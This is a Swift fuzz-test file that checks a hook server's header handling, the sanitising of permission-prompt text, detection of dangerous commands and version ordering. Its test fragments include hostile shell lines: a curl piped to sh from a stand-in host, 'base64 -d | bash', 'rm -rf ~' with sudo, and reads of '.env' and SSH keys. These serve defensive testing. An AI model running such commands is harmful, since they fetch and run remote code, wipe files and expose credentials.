import Foundation

// Random inputs against the functions that read what comes from outside the app: the hook
// receiver's header verdict, the permission dropdown's text and danger signs, and release
// version strings. Each property must hold for every input; a failure prints the seed and
// the input. Seeded, so a run is repeatable: FUZZ_SEED=<n> to replay one.

struct SplitMix64: RandomNumberGenerator {
    var state: UInt64
    mutating func next() -> UInt64 {
        state &+= 0x9E37_79B9_7F4A_7C15
        var z = state
        z = (z ^ (z >> 30)) &* 0xBF58_476D_1CE4_E5B9
        z = (z ^ (z >> 27)) &* 0x94D0_49BB_1331_11EB
        return z ^ (z >> 31)
    }
}

@main
struct FuzzChecks {
    static let seed = UInt64(ProcessInfo.processInfo.environment["FUZZ_SEED"] ?? "") ?? 20261117
    static var rng = SplitMix64(state: seed)

    static func pick<T>(_ items: [T]) -> T { items.randomElement(using: &rng)! }
    static func chance(_ p: Double) -> Bool { Double.random(in: 0..<1, using: &rng) < p }

    /// Pieces that hit the edges: shell, control and format characters, Hangul fillers,
    /// line separators, emoji, combining marks, long runs.
    static let fragments: [String] = [
        "rm -rf ~", "curl https://x.example/i.sh | sh", "sudo ", "base64 -d | bash", "cat .env", "~/.ssh/id_rsa",
        ">> ~/.zshrc", "echo ok", "git status", "\n", "\n\n\n", "  ", "\t", "\r", "\r\n", "\u{1B}[2K", "\u{0}",
        "\u{202E}", "\u{200B}", "\u{2028}", "\u{2029}", "\u{FEFF}", "\u{3164}", "\u{115F}", "\u{2800}", "\u{034F}",
        "\u{FE0F}", "e\u{301}", "👩‍💻", "한글 경로", "⟨U+202E⟩", "*** Update File: a.txt", "\"", "'", "\\", "$(", "`",
        String(repeating: "x", count: 300), String(repeating: "\n", count: 50), "가", "ｗｉｄｅ",
    ]

    static func randomText(maxPieces: Int = 12) -> String {
        (0..<Int.random(in: 0...maxPieces, using: &rng)).map { _ in
            chance(0.15) ? String(UnicodeScalar(UInt32.random(in: 0...0x2FFF, using: &rng)).map(Character.init) ?? "?") : pick(fragments)
        }.joined()
    }

    static func fail(_ property: String, _ input: String) -> Never {
        print("FAIL: \(property)\n  seed \(seed)\n  input \(input.debugDescription.prefix(400))")
        exit(1)
    }

    static func main() {
        headerVerdict()
        permissionText()
        permissionRisk()
        appVersion()
        print("FuzzChecks: all properties hold (seed \(seed))")
    }

    static func headerVerdict() {
        let methods = ["POST", "GET", "post", "PUT", "", "POST POST", "\u{0}"]
        let paths = ["/permission-hook", "/claude-hook", "/next-step-hook", "/", "/x/permission-hook", "", "%00"]
        let names = ["Content-Length", "content-length", "CONTENT-LENGTH", "Host", "host", "Origin", "origin", "X-Thing", "Content-Length ", " Host"]
        let values = ["0", "12", "-1", "-0", "+5", "33554432", "33554433", "99999999999999999999999", "abc", "", "1 2",
                      "127.0.0.1:4318", "localhost", "LOCALHOST:1", "evil.example", "127.0.0.1.evil.example", "[::1]:4318",
                      "null", "https://evil.example", ":", "::::", "\u{202E}"]
        for _ in 0..<20_000 {
            var lines = ["\(pick(methods)) \(pick(paths)) HTTP/1.1"]
            for _ in 0..<Int.random(in: 0...6, using: &rng) {
                lines.append(chance(0.1) ? randomText(maxPieces: 3) : "\(pick(names)):\(chance(0.5) ? " " : "")\(pick(values))")
            }
            let header = lines.joined(separator: chance(0.9) ? "\r\n" : "\n")
            let verdict = HookHTTPServer.verdict(forHeader: header)
            guard case .accept(_, let length) = verdict else { continue }
            if !(0...HookHTTPServer.maxBodyBytes).contains(length) { fail("an accepted length is within 0...max", header) }
            if !header.hasPrefix("POST ") { fail("only POST is accepted", header) }
            let headerLines = header.components(separatedBy: "\r\n").dropFirst()
            if headerLines.contains(where: { $0.split(separator: ":", maxSplits: 1).first?.trimmingCharacters(in: .whitespaces).lowercased() == "origin" }) {
                fail("a request with Origin is never accepted", header)
            }
        }
    }

    static func isHidden(_ scalar: Unicode.Scalar) -> Bool {
        switch scalar.properties.generalCategory {
        case .control: return scalar != "\n" && scalar != "\t"
        case .format, .lineSeparator, .paragraphSeparator: return true
        default: return scalar.properties.isDefaultIgnorableCodePoint || scalar == "\u{2800}"
        }
    }

    static func permissionText() {
        for _ in 0..<20_000 {
            let raw = chance(0.002) ? String(repeating: randomText(), count: 2_000) : randomText(maxPieces: 30)
            let text = PermissionText(raw)
            if let hidden = text.full.unicodeScalars.first(where: isHidden) {
                fail("nothing invisible is left in what is shown (U+\(String(hidden.value, radix: 16)))", raw)
            }
            if text.isWhole, text.lines.count > PermissionText.wholeLines || text.full.count > PermissionText.wholeCharacters || text.isTooLong {
                fail("whole means it fits: at most \(PermissionText.wholeLines) lines and \(PermissionText.wholeCharacters) characters", raw)
            }
            if text.preview.count > PermissionText.previewLines || text.preview.contains(where: { $0.count > PermissionText.lineCut + 1 }) {
                fail("the preview is at most \(PermissionText.previewLines) lines, each cut by us", raw)
            }
            guard !text.isTooLong else { continue }
            // Folding only replaces blank lines: every line with something on it is still there, in order.
            let shown = text.lines.filter { !$0.trimmingCharacters(in: .whitespaces).isEmpty && !$0.hasPrefix("⟨빈 줄 ") }
            let expected = text.full.components(separatedBy: "\n").filter { !$0.trimmingCharacters(in: .whitespaces).isEmpty }
            if shown != expected { fail("folding blank lines drops no line that has text", raw) }
        }
    }

    static func permissionRisk() {
        let tools = ["Bash", "Write", "Edit", "Read", "apply_patch", "mcp__x__y"]
        for _ in 0..<10_000 {
            let raw = randomText(maxPieces: 20)
            let tool = pick(tools)
            if PermissionRisk.found(in: raw, toolName: tool) != PermissionRisk.found(in: raw, toolName: tool) {
                fail("the danger signs are the same every time", raw)
            }
        }
        // A sign must survive being buried in noise around it.
        for _ in 0..<2_000 {
            let raw = randomText(maxPieces: 4) + "\nsudo rm -rf ~\n" + randomText(maxPieces: 4)
            let signs = PermissionRisk.found(in: raw, toolName: "Bash")
            if !signs.contains(.admin) || !signs.contains(.wipes) { fail("sudo and rm -rf ~ on their own line are always caught", raw) }
        }
    }

    static func appVersion() {
        func randomVersion() -> AppVersion {
            var text = (0..<Int.random(in: 1...4, using: &rng)).map { _ in String(Int.random(in: 0...12, using: &rng)) }.joined(separator: ".")
            if chance(0.3) { text = "v" + text }
            if chance(0.4) { text += pick(["-beta.", "-beta", "-rc.", "-"]) + (chance(0.8) ? String(Int.random(in: 0...12, using: &rng)) : "") }
            if chance(0.05) { text = randomText(maxPieces: 2) }
            return AppVersion(text)
        }
        for _ in 0..<20_000 {
            let a = randomVersion(), b = randomVersion(), c = randomVersion()
            if a < a { fail("a version is not before itself", a.description) }
            if a < b, b < a { fail("two versions are not each before the other", "\(a) / \(b)") }
            if a < b, b < c, !(a < c) { fail("before is transitive", "\(a) / \(b) / \(c)") }
            if !(a < b), !(b < a), (a < c) != (b < c) { fail("equal versions compare alike", "\(a) / \(b) / \(c)") }
            if a.isBeta, !b.isBeta, a.core == b.core, !(a < b) { fail("a beta comes before its release", "\(a) / \(b)") }
        }
    }
}
